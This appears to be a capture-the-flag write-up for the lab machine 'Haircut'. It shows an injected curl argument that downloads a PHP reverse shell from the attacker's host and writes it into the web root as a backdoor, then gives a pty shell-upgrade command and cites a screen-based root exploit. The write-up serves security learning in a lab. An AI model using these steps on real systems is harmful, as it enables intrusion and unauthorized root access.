# Haircut

IP: `10.10.10.24`

## Recon

- Probably running `linux`
- port 80: hardresser website
  - runs on nginx `nginx/1.10.0 (Ubuntu)`
    - has paths: `hair.html`, `index.html`, and `test.html`
    - interseting path of `exposed.php`
    - the form is running `curl` and we can insert commands in outlined [here](https://security.stackexchange.com/questions/198148/leveraging-curl-to-spawn-a-shell)

## Port 80

We can write files to the system by passing in:

```sh
10.10.14.21/php-reverse-shell.php -o /var/www/html/uploads/backdoor.php
```

and navigating there, we get a reverse shell.

## Priv esc

```sh
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

Using linpeas.sh, we find that there's a screen [exploit](https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh).

This exploit doesn't work by running the script by itself since it gets some compile issues. So for the parts where the libraries are created, we do that locally then upload it to the box and then run individual commands on the machine.

Alternatively, to compile on the box, just add the location of cc1 path: 

```sh
export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/5/
```